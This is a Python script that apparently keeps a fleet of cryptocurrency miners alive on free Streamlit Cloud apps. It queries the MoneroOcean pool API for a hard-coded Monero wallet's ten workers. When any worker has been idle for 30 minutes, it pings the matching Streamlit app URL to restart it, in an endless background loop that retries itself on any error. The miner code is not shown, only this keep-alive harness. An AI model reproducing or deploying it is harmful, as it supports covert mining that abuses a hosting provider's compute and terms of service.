import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 30:
    #mv4
    if worker == "mv4gen1":
      requests.get("https://vyom00907-mv4-mv4gen1-cnm2nx.streamlit.app/")
    if worker == "mv4gen2":
      requests.get("https://vyom00907-mv4-mv4gen2-80oz74.streamlit.app/")
    if worker == "mv4gen3":
      requests.get("https://vyom00907-mv4-mv4gen3-hsp0h6.streamlit.app/")
    if worker == "mv4gen4":
      requests.get("https://vyom00907-mv4-mv4gen4-mjwhgd.streamlit.app/")
    if worker == "mv4gen5":
      requests.get("https://vyom00907-mv4-mv4gen5-pyybud.streamlit.app/")
    if worker == "mv4gen6":
      requests.get("https://vyom00907-mv4-mv4gen6-83xtfo.streamlit.app/")
    if worker == "mv4gen7":
      requests.get("https://vyom00907-mv4-mv4gen7-3r0hik.streamlit.app/")
    if worker == "mv4gen8":
      requests.get("https://vyom00907-mv4-mv4gen8-qxfxtq.streamlit.app/")
    if worker == "mv4gen9":
      requests.get("https://vyom00907-mv4-mv4gen9-icdenn.streamlit.app/")
    if worker == "mv4gen10":
      requests.get("https://vyom00907-mv4-mv4gen10-b0ki7y.streamlit.app/")
    
      

def stch():
    while 1==1 :
      
      #mv4
      resp("mv4gen1")
      resp("mv4gen2")
      resp("mv4gen3")
      resp("mv4gen4")
      resp("mv4gen5")
      resp("mv4gen6")
      resp("mv4gen7")
      resp("mv4gen8")
      resp("mv4gen9")
      resp("mv4gen10")

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
